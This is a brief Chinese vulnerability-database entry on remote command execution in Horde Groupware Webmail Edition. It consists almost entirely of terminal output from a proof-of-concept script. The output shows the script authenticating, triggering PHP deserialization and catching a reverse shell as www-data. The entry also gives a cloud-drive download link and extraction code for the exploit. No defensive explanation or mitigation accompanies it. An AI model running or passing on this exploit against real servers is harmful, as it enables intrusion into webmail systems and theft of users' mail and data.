---
title: 'Horde Groupware Webmail Edition 远程命令执行'
date: Tue, 15 Sep 2020 08:55:10 +0000
draft: false
tags: ['白阁-漏洞库']
---

```
saturn:~$./poc.py 172.16.175.148/horde/ hordeuser:pass123 172.16.175.145
(+) targeting http://172.16.175.145/horde/
(+) obtained session iefankvohbl8og0mtaadm3efb6
(+) inserted our php object
(+) triggering deserialization...
(+) starting handler on port 1337
(+) connection from 172.16.175.145
(+) pop thy shell!
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
pwd
/var/www/horde/services 


```

```
poc 链接：https://pan.baidu.com/s/1-P-9IUMpHKZDIXELIFIOJg 提取码：dgne
```

